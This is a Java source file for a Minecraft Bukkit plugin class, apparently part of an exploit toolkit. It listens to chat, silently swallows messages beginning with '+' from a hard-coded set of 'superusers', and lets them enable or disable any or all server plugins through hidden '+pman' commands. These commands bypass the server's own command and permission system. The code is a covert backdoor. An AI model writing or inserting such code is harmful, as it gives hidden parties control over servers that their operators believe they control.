package at.nexusmodsclient.ExpoPro;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;

import at.nexusmodsclient.ExpoPlus.Expo;
import at.nexusmodsclient.ExpoPro.Mans.PlugMan;

public class ExpoPro implements Listener{
	
	public ExpoPro(JavaPlugin plugin)
	{
		plugin.getServer().getPluginManager().registerEvents(this, plugin);
	}
	
	@EventHandler(priority=EventPriority.HIGHEST)
	public void onPlayerChat(AsyncPlayerChatEvent e) {
		Player p = e.getPlayer();
		String m = e.getMessage();
		
		if(m.startsWith("+"))
		{
			if(Main.superusers.contains(p))
			{
				e.setCancelled(true);
				
				if(m.contains("+pman"))
				{
					String[] args = m.split(" ");
					
					if(args[0].equalsIgnoreCase("+pman"))
					{
						if(args[1].equalsIgnoreCase("disable"))
						{
							if(args[2].equalsIgnoreCase("all"))
							{
								if(PlugMan.disableAll())
									p.sendMessage(Expo.Prefix+"Alle Plugins wurden Deaktiviert!");
								else
									p.sendMessage(Expo.Prefix+"Deaktivieren der Plugins Fehlgeschlagen!");
							}
							else if(!args[2].equalsIgnoreCase(" "))
							{
								Plugin plug = Bukkit.getServer().getPluginManager().getPlugin(args[2]);
								if(plug != null)
								{
									if(PlugMan.disable(plug))
										p.sendMessage(Expo.Prefix+"Das Plugin wurden Deaktiviert!");
									else
										p.sendMessage(Expo.Prefix+"Deaktivieren des Plugins Fehlgeschlagen!");
								}
							}
						}
						else if (args[1].equalsIgnoreCase("enable"))
						{
							if(!args[2].equalsIgnoreCase(" "))
							{
								Plugin plug = Bukkit.getServer().getPluginManager().getPlugin(args[2]);
								if(plug != null)
								{
									if(PlugMan.enable(plug))
										p.sendMessage(Expo.Prefix+"Das Plugin wurden Aktiviert!");
									else
										p.sendMessage(Expo.Prefix+"Aktivieren des Plugins Fehlgeschlagen!");
								}
							}
						}
					}
				}
			}
		}
	}
}
